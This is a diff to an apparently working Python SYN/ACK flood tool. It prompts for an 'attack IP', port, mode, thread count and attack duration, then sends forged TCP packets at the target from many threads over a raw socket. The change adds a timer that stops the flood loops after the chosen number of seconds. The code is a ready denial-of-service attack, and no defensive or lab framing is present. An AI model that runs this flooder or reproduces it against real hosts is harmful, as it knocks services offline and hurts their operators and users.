@@ -4,17 +4,19 @@ import socket
 import struct
 import random
 import threading
+import time
 
 
 class myThread(threading.Thread):
-    def __init__(self, dstip, dstport, mode):
+    def __init__(self, dstip, dstport, mode, time):
         threading.Thread.__init__(self)
         self.dstip = dstip
         self.dstport = dstport
         self.mode = mode
+        self.times = time
 
     def run(self):
-        attack(self.dstip, self.dstport, self.mode)
+        attack(self.dstip, self.dstport, self.mode, self.times)
 
 
 def uchar_checksum(data, byteorder='big'):
@@ -107,30 +109,43 @@ def makepacket(dstip, dstport, fg):
     return ippacket
 
 
-def attack(dstip, dstport, mode):
+def attack(dstip, dstport, mode, times):
     if mode == '1':  # syn
         fg = 2
+        st = time.time()
         while 1:
-            data = makepacket(dstip, dstport, fg)
-            print(data)
-            addr = (dstip, dstport)
-            # s.connect_ex((dstip, dstport))
-            s.sendto(data, addr)
+            end = time.time()
+            if end - st < times:
+                data = makepacket(dstip, dstport, fg)
+                # print(data)
+                addr = (dstip, dstport)
+                # s.connect_ex((dstip, dstport))
+                s.sendto(data, addr)
+            else:
+                exit()
     elif mode == '2':  # ack
         fg = 18
+        st = time.time()
         while 1:
-            data = makepacket(dstip, dstport, fg)
-            s.sendto(data, (dstip, dstport))
+            end = time.time()
+            if end - st < times:
+                data = makepacket(dstip, dstport, fg)
+                s.sendto(data, (dstip, dstport))
+            else:
+                exit()
     elif mode == '3':  # syn&ack
+        st = time.time()
         while 1:
-            data = makepacket(dstip, dstport, 2)
-            s.sendto(data, (dstip, dstport))
-            data = makepacket(dstip, dstport, 18)
-            s.sendto(data, (dstip, dstport))
+            end = time.time()
+            if end - st < times:
+                data = makepacket(dstip, dstport, 2)
+                s.sendto(data, (dstip, dstport))
+                data = makepacket(dstip, dstport, 18)
+                s.sendto(data, (dstip, dstport))
+            else:
+                exit()
     else:
-        print('DON\'T xia say!')
-
-
+        print('输入错误')
 
 
 ip_first = []
@@ -155,19 +170,18 @@ s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 # s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 
 
-
-
 if __name__ == '__main__':
     dstip = input('attack IP:')
     dstport = int(input('attack PORT:'))
     mode = input('mode:(syn or ack or syn&ack)')
     threads = int(input("线程数threads："))
+    times = int(input("攻击时间："))
     threads_name = []
     for i in range(threads):
         threads_name.append('teread' + str(i))
 
     for i in range(threads):
-        threads_name[i] = myThread(dstip, dstport, mode)
+        threads_name[i] = myThread(dstip, dstport, mode, times)
 
     for i in range(threads):
         threads_name[i].start()
